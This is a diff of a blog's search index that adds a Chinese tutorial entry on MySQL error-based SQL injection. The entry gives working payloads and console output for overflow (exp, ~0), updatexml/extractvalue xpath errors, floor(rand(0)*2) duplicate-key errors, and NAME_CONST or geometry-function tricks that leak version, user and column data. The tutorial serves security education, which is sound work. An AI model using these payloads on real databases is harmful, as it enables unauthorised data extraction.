@@ -3777,7 +3777,7 @@ Flask是一个使用Python编写的轻量级web应用框架，其WSGI工具箱�
   <entry>
     <title>基于约束的SQL攻击</title>
     <url>/%E5%9F%BA%E4%BA%8E%E7%BA%A6%E6%95%B0%E7%9A%84SQL%E6%94%BB%E5%87%BB/</url>
-    <content><![CDATA[<p>关于sql中insert 和 select 对长度和空格的处理方式差异造成的漏洞</p>
+    <content><![CDATA[<p>sql 中 insert 和 select 对字符串处理方式的差异造成的漏洞</p>
 <span id="more"></span>
 
 <h2 id="1-背景介绍"><a href="#1-背景介绍" class="headerlink" title="1. 背景介绍"></a>1. 背景介绍</h2><p>一个有趣的代码片段，开发者尝试各种方法来确保数据库的安全访问，当新用户尝试注册时，将运行以下代码：</p>
@@ -3841,6 +3841,265 @@ Flask是一个使用Python编写的轻量级web应用框架，其WSGI工具箱�
 <li><a href="https://blog.csdn.net/weixin_41489908/article/details/108481692">基于约束的sql攻击</a>,来自<a href="https://www.csdn.net/">CSDN</a></li>
 <li><a href="https://www.k0rz3n.com/2017/06/03/passsignup/">基于约束的SQL攻击</a>,来自<a href="https://www.k0rz3n.com/">K0rz3n’s Blog</a></li>
 </ul>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+        <category>CTF</category>
+        <category>Web 安全</category>
+      </categories>
+      <tags>
+        <tag>网络安全</tag>
+        <tag>Web 安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>报错注入</title>
+    <url>/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<p>SQL报错注入就是利用数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。</p>
+<span id="more"></span>
+
+<p>这种手段在联合查询受限且能返回错误信息的情况下比较好用，毕竟用盲注的话既耗时又容易被封。</p>
+<p>MYSQL报错注入个人认为大体可以分为以下几类：</p>
+<ol>
+<li>BIGINT等数据类型溢出</li>
+<li>xpath语法错误</li>
+<li>concat+rand()+group_by()导致主键重复</li>
+<li>一些特性</li>
+</ol>
+<p>下面就针对这几种错误类型看看背后的原理是怎样的。</p>
+<h2 id="1-数据溢出"><a href="#1-数据溢出" class="headerlink" title="1. 数据溢出"></a>1. 数据溢出</h2><p>这里可以看到mysql是怎么处理整形的：<a href="https://dev.mysql.com/doc/refman/8.0/en/integer-types.html">Integer Types (Exact Value)</a>，如下表：</p>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Storage (Bytes)</th>
+<th>Minimum Value Signed</th>
+<th>Minimum Value Unsigned</th>
+<th>Maximum Value Signed</th>
+<th>Maximum Value Unsigned</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>TINYINT</td>
+<td>1</td>
+<td>-128</td>
+<td>0</td>
+<td>127</td>
+<td>255</td>
+</tr>
+<tr>
+<td>SMALLINT</td>
+<td>2</td>
+<td>-32768</td>
+<td>0</td>
+<td>32767</td>
+<td>65535</td>
+</tr>
+<tr>
+<td>MEDIUMINT</td>
+<td>3</td>
+<td>-8388608</td>
+<td>0</td>
+<td>8388607</td>
+<td>16777215</td>
+</tr>
+<tr>
+<td>INT</td>
+<td>4</td>
+<td>-2147483648</td>
+<td>0</td>
+<td>2147483647</td>
+<td>4294967295</td>
+</tr>
+<tr>
+<td>BIGINT</td>
+<td>8</td>
+<td>-9223372036854775808</td>
+<td>0</td>
+<td>9223372036854775807</td>
+<td>18446744073709551615</td>
+</tr>
+</tbody></table>
+<p>在mysql5.5之前，整形溢出是不会报错的，根据官方文档说明<a href="https://dev.mysql.com/doc/refman/8.0/en/out-of-range-and-overflow.html">out-of-range-and-overflow</a>，只有版本号大于5.5.5时，才会报错。试着对最大数做加法运算，可以看到报错的具体情况：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select 18446744073709551615+1;</span></span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#x27;(18446744073709551615 + 1)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>在mysql中，要使用这么大的数，并不需要输入这么长的数字进去，使用按位取反运算运算即可：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select ~0;</span></span><br><span class="line">+----------------------+</span><br><span class="line">| ~0                   |</span><br><span class="line">+----------------------+</span><br><span class="line">| 18446744073709551615 |</span><br><span class="line">+----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select ~0+1;</span></span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#x27;(~(0) + 1)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>我们知道，如果一个查询成功返回，则其返回值为0，进行逻辑非运算后可得1，这个值是可以进行数学运算的：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select (select * from (select user())x);</span></span><br><span class="line">+----------------------------------+</span><br><span class="line">| (select * from (select user())x) |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| root@localhost                   |</span><br><span class="line">+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select !(select * from (select user())x);</span></span><br><span class="line">+-----------------------------------+</span><br><span class="line">| !(select * from (select user())x) |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">|                                 1 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select !(select * from (select user())x)+1;</span></span><br><span class="line">+-------------------------------------+</span><br><span class="line">| !(select * from (select user())x)+1 |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">|                                   2 |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>同理，利用exp函数也会产生类似的溢出错误：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select exp(709);</span></span><br><span class="line">+-----------------------+</span><br><span class="line">| exp(709)              |</span><br><span class="line">+-----------------------+</span><br><span class="line">| 8.218407461554972e307 |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select exp(710);</span></span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#x27;exp(710)&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>注入姿势：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select exp(~(select*from(select user())x));</span></span><br><span class="line">ERROR 1690 (22003): DOUBLE value is out of range in &#x27;exp(~((select &#x27;root@localhost&#x27; from dual)))&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>利用这一特性，再结合之前说的溢出报错，就可以进行注入了。这里需要说一下，经笔者测试，发现在mysql5.5.47可以在报错中返回查询结果：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select (select(!x-~0)from(select(select user())x)a);</span></span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#x27;((not(&#x27;root@localhost&#x27;)) - ~(0))&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>而在mysql&gt;5.5.53时，则不能返回查询结果</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select (select(!x-~0)from(select(select user())x)a);</span></span><br><span class="line">ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#x27;((not(`a`.`x`)) - ~(0))&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>此外，报错信息是有长度限制的，在mysql/my_error.c中可以看到：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/* Max length of a error message. Should be</span><br><span class="line">kept in sync with MYSQL_ERRMSG_SIZE. */</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">define ERRMSGSIZE (512)</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="2-xpath语法错误"><a href="#2-xpath语法错误" class="headerlink" title="2. xpath语法错误"></a>2. xpath语法错误</h2><p>从mysql5.1.5开始提供两个<a href="https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html">XML查询和修改的函数</a>，extractvalue和updatexml。extractvalue负责在xml文档中按照xpath语法查询节点内容，updatexml则负责修改查询到的内容:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select extractvalue(1,<span class="string">&#x27;/a/b&#x27;</span>);</span></span><br><span class="line">+------------------------+</span><br><span class="line">| extractvalue(1,&#x27;/a/b&#x27;) |</span><br><span class="line">+------------------------+</span><br><span class="line">|                        |</span><br><span class="line">+------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure>
+
+<p>它们的第二个参数都要求是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select updatexml(1,concat(0x7e,(select @@version),0x7e),1);</span></span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~5.7.17~&#x27;</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select extractvalue(1,concat(0x7e,(select @@version),0x7e));</span></span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~5.7.17~&#x27;</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-主键重复"><a href="#3-主键重复" class="headerlink" title="3. 主键重复"></a>3. 主键重复</h2><blockquote>
+<p>相关函数</p>
+<ul>
+<li>rand()：产生一个 0~1 的随机数</li>
+<li>floor()：向下取整</li>
+<li>floor(rand(0)*2))：原本 floor(rand(0)) 得到固定的0，但乘以2 后得到的就是不固定的 0 或者 1</li>
+</ul>
+</blockquote>
+<p>这里利用到了count()和group by在遇到rand()产生的重复值时报错的思路。网上比较常见的payload是这样的：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select count(*) from <span class="built_in">test</span> group by concat(version(),floor(rand(0)*2));</span></span><br><span class="line">ERROR 1062 (23000): Duplicate entry &#x27;5.7.171&#x27; for key &#x27;&lt;group_key&gt;&#x27;</span><br></pre></td></tr></table></figure>
+<p>可以看到错误类型是duplicate entry，即主键重复。实际上只要是count，rand()，group by三个连用就会造成这种报错，与位置无关：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x;</span></span><br><span class="line">ERROR 1062 (23000): Duplicate entry &#x27;5.7.171&#x27; for key &#x27;&lt;group_key&gt;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>这种报错方法的本质是因为floor(rand(0)*2)的重复性，导致group by语句出错。group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表的数据；如果key不在临时表中，则在临时表中插入key所在行的数据。举个例子，表中数据如下：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from <span class="built_in">test</span>;</span></span><br><span class="line">+------+-------+</span><br><span class="line">| id   | name  |</span><br><span class="line">+------+-------+</span><br><span class="line">| 0    | jack  |</span><br><span class="line">| 1    | jack  |</span><br><span class="line">| 2    | tom   |</span><br><span class="line">| 3    | candy |</span><br><span class="line">| 4    | tommy |</span><br><span class="line">| 5    | jerry |</span><br><span class="line">+------+-------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>我们以<code>select count(*) from test group by name</code>语句说明大致过程如下：</p>
+<ul>
+<li><p>先是建立虚拟表，其中key为主键，不可重复：</p>
+<table>
+<thead>
+<tr>
+<th>key</th>
+<th>count(*)</th>
+</tr>
+</thead>
+</table>
+</li>
+<li><p>开始查询数据，去数据库数据，然后查看虚拟表是否存在，不存在则插入新记录，存在则count(*)字段直接加1:</p>
+<table>
+<thead>
+<tr>
+<th>key</th>
+<th>count(*)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>jack</td>
+<td>1</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>key</th>
+<th>count(*)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>jack</td>
+<td>1+1</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>key</th>
+<th>count(*)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>jack</td>
+<td>1+1</td>
+</tr>
+<tr>
+<td>tom</td>
+<td>1</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>key</th>
+<th>count(*)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>jack</td>
+<td>1+1</td>
+</tr>
+<tr>
+<td>tom</td>
+<td>1</td>
+</tr>
+<tr>
+<td>candy</td>
+<td>1</td>
+</tr>
+</tbody></table>
+</li>
+</ul>
+<p>当这个操作遇到 rand(0)*2 时，就会发生错误，其原因在于rand()函数使用了随机种子 0，得到的是一个稳定的序列，也就是说每次以0作为随机种子得到的序列是一样的。</p>
+<p>同理，floor(rand(0)*2)则会固定得到序列(这个很重要)，假设我们得到的序列是 011011..</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select floor(rand(0)*2) from <span class="built_in">test</span>;</span></span><br><span class="line">+------------------+</span><br><span class="line">| floor(rand(0)*2) |</span><br><span class="line">+------------------+</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">|                0 |</span><br><span class="line">|                1 |</span><br><span class="line">|                1 |</span><br><span class="line">+------------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<p>回到之前的group by语句上，我们将其改为<code>select count(*) from test group by floor(rand(0)*2)</code>，看看每一步是什么情况：</p>
+<ul>
+<li>语句执行的时候建立一个虚拟表，整个工作流程大致如下：开始查询数据时，读取数据库数据，查看虚拟表中是否存在，不存在则插入新纪录，存在则 count(*) 直接加 1。 假设 floor(rand(0)*2) 得到的固定序列是 011011…</li>
+<li>先创建一个虚拟表<table>
+<thead>
+<tr>
+<th>key</th>
+<th>count(*)</th>
+</tr>
+</thead>
+</table>
+</li>
+<li>取第一条记录，执行 floor(rand(0)*2)，发现结果为0（第一次计算），查询虚拟表，发现 0 的键值不存在，则 floor(rand(0)*2) 会被再会计算一次，结果为1（第二次计算），插入虚表<table>
+<thead>
+<tr>
+<th>key</th>
+<th>count(*)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>1</td>
+</tr>
+</tbody></table>
+</li>
+<li>查第二条记录，再次计算 floor(rand(0)<em>2)，发现结果为1(第三次计算)，查询虚表，发现键值 1 存在，所以此时不在计算第二次，直接count(</em>)值加1，如下：<table>
+<thead>
+<tr>
+<th>key</th>
+<th>count(*)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>2(1+1)</td>
+</tr>
+</tbody></table>
+</li>
+<li>查第三条记录，再次计算floor(rand(0)*2)，发现结果为0(第四次计算)，发现键值没有0，则尝试插入记录，此时会又一次计算floor(rand(0)*2)，结果1(第5次计算)当作虚表的主键，而此时1这个主键已经存在于虚表中了，所以在插入的时候就会报主键重复的错误了。</li>
+<li>最终报错的结果，即主键’1’重复：<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select count(*) from <span class="built_in">test</span> group by floor(rand(0)*2);</span></span><br><span class="line">ERROR 1062 (23000): Duplicate entry &#x27;1&#x27; for key &#x27;&lt;group_key&gt;&#x27;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>整个查询过程中，floor(rand(0)*2)被计算了5次，查询原始数据表3次，所以表中需要至少3条数据才能报错。关于这个rand()的问题，官方文档在这里有个说明：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">RAND() in a WHERE clause is evaluated for every row (when selecting from one table) or combination of rows (when selecting from a multiple-table join). Thus, for optimizer purposes, RAND() is not a constant value and cannot be used for index optimizations.</span><br></pre></td></tr></table></figure>
+
+<p>如果有一个序列开头时 0,1,0,0 或者 1,0,1,1 则无论如何都不会报错了，因为虚表开头两个主键会分别是 0 和 1，后面的就直接count(*)加1了</p>
+<h2 id="4-一些特性"><a href="#4-一些特性" class="headerlink" title="4. 一些特性"></a>4. 一些特性</h2><h3 id="4-1-列名重复"><a href="#4-1-列名重复" class="headerlink" title="4.1 列名重复"></a>4.1 列名重复</h3><p>mysql列名重复会报错，我们利用name_const来制造一个列：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;</span></span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;5.7.17&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>根据<a href="https://dev.mysql.com/doc/refman/5.7/en/miscellaneous-functions.html#function_name-const">官方文档</a>，name_const函数要求参数必须是常量，所以实际使用上还没找到什么比较好的利用方式。</p>
+<p>利用这个特性加上join函数可以爆列名：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select *  from(select * from <span class="built_in">test</span> a join <span class="built_in">test</span> b)c;</span></span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;id&#x27;</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select *  from(select * from <span class="built_in">test</span> a join <span class="built_in">test</span> b using(id))c;</span></span><br><span class="line">ERROR 1060 (42S21): Duplicate column name &#x27;name&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-2-几何函数"><a href="#4-2-几何函数" class="headerlink" title="4.2 几何函数"></a>4.2 几何函数</h3><p>mysql有些几何函数，例如geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()，这些函数对参数要求是形如(1 2,3 3,2 2 1)这样几何数据，如果不满足要求，则会报错。经测试，在版本号为5.5.47上可以用来注入，而在5.7.17上则不行：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">5.5.47</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select multipoint((select * from (select * from (select version())a)b));</span></span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &#x27;(select `b`.`version()` from ((select &#x27;5.5.47&#x27; AS `version()` from dual) `b`))&#x27; value found during parsing</span><br><span class="line">5.7.17</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select multipoint((select * from (select * from (select version())a)b));</span></span><br><span class="line">ERROR 1367 (22007): Illegal non geometric &#x27;(select `a`.`version()` from ((select version() AS `version()`) `a`))&#x27; value found during parsing</span><br></pre></td></tr></table></figure>
+
+<p>————————————————<br>本文主要参考<a href="https://xz.aliyun.com/">先知社区</a> 的文章 <a href="https://xz.aliyun.com/t/253">MYSQL报错注入的一点总结</a>，仅作些许修改。</p>
 ]]></content>
       <categories>
         <category>网络安全</category>
